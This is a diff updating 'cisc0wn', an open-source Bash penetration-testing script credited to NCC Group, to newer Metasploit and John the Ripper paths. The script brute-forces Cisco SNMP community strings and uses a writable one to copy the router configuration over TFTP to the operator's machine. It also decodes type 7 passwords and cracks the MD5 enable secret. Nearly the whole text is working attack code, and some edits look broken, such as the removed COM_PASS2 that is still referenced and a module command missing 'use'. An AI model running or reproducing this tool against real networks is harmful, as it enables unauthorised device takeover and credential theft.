@@ -6,13 +6,15 @@
 # Twitter = @commonexploits
 # 29/05/2012
 # Requires metasploit, snmpwalk and john the ripper - suggest backtrack as built in (tested on BT5)
-VERSION="1.7" # updated 16/03/15 by darren dot mcdonald @ nccgroup dot com - See README for details 
+VERSION="1.8" # updated 16/03/15 by darren dot mcdonald @ nccgroup dot com - See README for details
+# updated 03/09/2015 by Jason Soto, jason_soto at jsitech dot com - SEE README
 
 #####################################################################################
 # Released as open source by NCC Group Plc - http://www.nccgroup.com/
 
 # Developed by Daniel Compton, daniel dot compton at nccgroup dot com
 # Updated by tom.watson @ nccgroup.com
+# Updated by Jason Soto, jason_soto@jsitech.com
 
 # https://github.com/nccgroup/cisco-SNMP-enumeration
 
@@ -22,12 +24,12 @@ VERSION="1.7" # updated 16/03/15 by darren dot mcdonald @ nccgroup dot com - See
 
 
 # user config settings
-COM_PASS1="/opt/metasploit/msf3/data/wordlists/snmp_default_pass.txt" #old location of snmp communities to try
-COM_PASS2="/opt/metasploit/apps/pro/data/wordlists/snmp_default_pass.txt" #new location of snmpt communities to try
+COM_PASS1="/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt" #old location of snmp communities to try
 OUTPUTDIR="/tmp/" #where config files downloaded will be stored
 SNMPVER="2c" #2c or change to 1
 PORT="161" #default snmp port
-JOHNDIR="/pentest/passwords/john/" #john location on BT.
+JOHNDIR="/usr/sbin/" #john location on BT.
+JOHNPASS="/usr/share/john/" #Location john password file
 THREADS="10" #metasploit threads to use
 JOHNWAIT="300" #seconds for john ripper to sleep whilst trying quick dictionary attack
 MYINT="eth0" # your local network interface, it assume is eth0. Only used to read your IP address for info.
@@ -48,7 +50,7 @@ echo "Checking dependencies"
 echo -e "\e[00;34m-------------------------------------------\e[00m"
 
 #Check for metasploit
-which msfcli >/dev/null
+which msfconsole >/dev/null
 if [ $? -eq 0 ]
 	then
 		echo ""
@@ -108,7 +110,7 @@ if [ -f $COM_PASS1 ]
             COM_PASS=$COM_PASS2
             echo ""
             echo -e "\e[00;32mI have found the community strings file\e[00m"
-    else    
+    else
         echo ""
         echo -e "\e[00;31mUnable to find the community strings file\e[00m"
         exit 1
@@ -123,6 +125,8 @@ echo ""
 echo -e "SNMP community password list is set to \e[00;32m$COM_PASS\e[00m"
 echo ""
 echo -e "John the Ripper is assumed to be installed here \e[00;32m$JOHNDIR\e[00m"
+echo ""
+echo -e "John the Ripper Password List is set to \e[00;32m$JOHNPASS\e[00m"
 echo ""
 echo "These settings and others can be changed within the header of this script"
 echo ""
@@ -176,7 +180,7 @@ COMNO=`cat "$COM_PASS" | wc -l`
 echo -e "\e[1;33m----------------------------------------------------------------------------\e[00m"
 echo "Now testing read only SNMP communities with "$COMNO" strings - please wait...."
 echo -e "\e[1;33m----------------------------------------------------------------------------\e[00m"
-READCOM=`msfconsole -Lqx "use auxiliary/scanner/snmp/snmp_login; set RHOSTS $CISCOIP; set PASS_FILE $COM_PASS; set RETRIES 1; set RPORT $PORT; set THREADS $THREADS; set VERSION 1 E; run; exit -y" 2>&1 |grep -i "READ-ONLY" | cut -d "'" -f 2`
+READCOM=`msfconsole -Lqx "use auxiliary/scanner/snmp/snmp_login; set RHOSTS $CISCOIP; set PASS_FILE $COM_PASS; set RETRIES 1; set RPORT $PORT; set THREADS $THREADS; set VERSION $SNMPVER; run; exit -y" 2>&1 |grep -i "read-only" | awk '{ print $6 }'`
 clear
 if [ -z "$READCOM" ]
 then
@@ -185,7 +189,7 @@ then
 	echo ""
 	echo -e "\e[1;33mIt is possible that the community string has an access-list applied\e[00m"
 	echo ""
-	echo -e "\e[1;33mScript will continue as there may be a writable string that can be used.\e[00m" 
+	echo -e "\e[1;33mScript will continue as there may be a writable string that can be used.\e[00m"
 	echo ""
 	echo "Press enter to continue"
 	read enterkey
@@ -203,7 +207,7 @@ echo -e "\e[1;33m---------------------------------------------------------------
 echo "Now testing for writable SNMP communities with "$COMNO" strings - please wait...."
 echo -e "\e[1;33m------------------------------------------------------------------------------\e[00m"
 echo ""
-WRITCOM=`msfconsole -Lqx "use auxiliary/scanner/snmp/snmp_login; set RHOSTS $CISCOIP; set PASS_FILE $COM_PASS; set RETRIES 1; set RPORT $PORT; set THREADS $THREADS; set VERSION 1 E; run; exit -y" 2>&1 |grep -i "READ-WRITE" | cut -d "'" -f 2`
+WRITCOM=`msfconsole -Lqx "use auxiliary/scanner/snmp/snmp_login; set RHOSTS $CISCOIP; set PASS_FILE $COM_PASS; set RETRIES 1; set RPORT $PORT; set THREADS $THREADS; set VERSION $SNMPVER; run; exit -y" 2>&1 |grep -i "read-write" | awk '{ print $6 }'`
 #WRITCOM=`msfcli auxiliary/scanner/snmp/snmp_login RHOSTS=$CISCOIP PASS_FILE=$COM_PASS RETRIES=1 RPORT=$PORT THREADS=$THREADS VERSION=1 E 2>&1 |grep -i "READ-WRITE" | cut -d "'" -f 2`
 if [[ -z "$READCOM" && -z "$WRITCOM" ]]
 then
@@ -469,7 +473,7 @@ clear
 echo -e "\e[1;33m----------------------------------------------------------------------------\e[00m"
 echo "Now attempting to download the router config file, please wait"
 echo -e "\e[1;33m----------------------------------------------------------------------------\e[00m"
-msfcli auxiliary/scanner/snmp/cisco_config_tftp RHOSTS=$CISCOIP LHOST=$LOCALIP COMMUNITY=$WRITCOM1 OUTPUTDIR=$OUTPUTDIR RETRIES=1 RPORT=$PORT THREADS=$THREADS VERSION=1 E >/dev/null 2>&1
+msfconsole -x "auxiliary/scanner/snmp/cisco_config_tftp; set RHOSTS $CISCOIP; set LHOST $LOCALIP; set COMMUNITY $WRITCOM1; set OUTPUTDIR $OUTPUTDIR; set RETRIES 1; set RPORT $PORT; set THREADS $THREADS; set VERSION $SNMPVER; run; exit -y" >/dev/null 2>&1
 cat "$OUTPUTDIR$CISCOIP.txt" >/dev/null 2>&1
 if [ $? = 1 ]
 then
@@ -503,7 +507,7 @@ then
 		echo -e "\e[1;33m---------------------------------------------\e[00m"
 		echo "Your decoded enable type 7 password is"
 		echo -e "\e[1;33m---------------------------------------------\e[00m"
-		
+
 ###################################################### perl decode ###############################
 perl <<'EOF'
 
@@ -590,13 +594,13 @@ then
 		echo -e "\e[00;32m"$ENLOCAL7VAL"\e[00m"
 		echo "$ENPW7" >"$OUTPUTDIR$CISCOIP-ciscolocal7pw.txt"
 		echo ""
-				
+
 		ENLOCAL7VALP="$ENLOCAL7VAL"
 		export ENLOCAL7VALP
 		echo -e "\e[1;33m---------------------------------------------\e[00m"
 		echo "Your decoded password for user "$ENLOCAL7" is"
 		echo -e "\e[1;33m---------------------------------------------\e[00m"
-		
+
 ###################################################### perl decode ###############################
 perl <<'EOF'
 
@@ -655,7 +659,7 @@ clear
 VTPPW7=`cat "$OUTPUTDIR$CISCOIP-router-config.txt" |grep -B1 "login" |grep "password 7" |awk '{print $NF}' |head -1 2>&1`
 if [ -z "$VTPPW7" ]
 then
-	
+
 	echo -e "\e[1;33mThere doesn't seem to be any encoded telnet passwords set\e[00m"
 	echo ""
 	echo "Press enter to continue"
@@ -756,10 +760,10 @@ read enterkey
 echo -e "\e[1;33m-------------------------------------------------------------------------------------------------------------------------------------------\e[00m"
 echo "I will now try and crack the MD5 for the enable secret, I will only try a quick wordlist at first. It will take "$JOHNWAIT" seconds"
 echo -e "\e[1;33m-------------------------------------------------------------------------------------------------------------------------------------------\e[00m"
-screen -d -m -S Cisc0wn-John "$JOHNDIR"john --wordlist="$JOHNDIR"password.lst --rules "$OUTPUTDIR$CISCOIP"-ciscosecret5pw.txt >/dev/null 2>&1
+screen -d -m -S Cisc0wn-John "$JOHNDIR"john --wordlist="$JOHNPASS"password.lst --rules "$OUTPUTDIR$CISCOIP"-ciscosecret5pw.txt >/dev/null 2>&1
 sleep $JOHNWAIT
 
-CLEARPW5=`grep "$SECPW5" "$JOHNDIR"john.pot |cut -d ":" -f 2 2>&1`
+CLEARPW5=`grep "$SECPW5" "$JOHNPASS"john.pot |cut -d ":" -f 2 2>&1`
 if [ -z "$CLEARPW5" ]
 then
 	clear
@@ -772,13 +776,13 @@ then
 	echo ""
 	echo "Press enter to continue and try and crack it, or CTRL C to abort"
 	read enterkey
-	rm "$JOHNDIR"john.rec >/dev/null 2>&1
+	rm "$JOHNPASS"john.rec >/dev/null 2>&1
 	"$JOHNDIR"john "$OUTPUTDIR$CISCOIP"-ciscosecret5pw.txt
 	echo ""
 	echo -e "\e[1;33m------------------------------------------------------------------------------\e[00m"
 	echo -e "All of the downloaded files can be found here \e[1;33m"$OUTPUTDIR$CISCOIP"*\e[00m"
 	echo -e "\e[1;33m------------------------------------------------------------------------------\e[00m"
-	
+
 else
 clear
 echo -e "\e[1;33m-----------------------------------------------------------------------\e[00m"
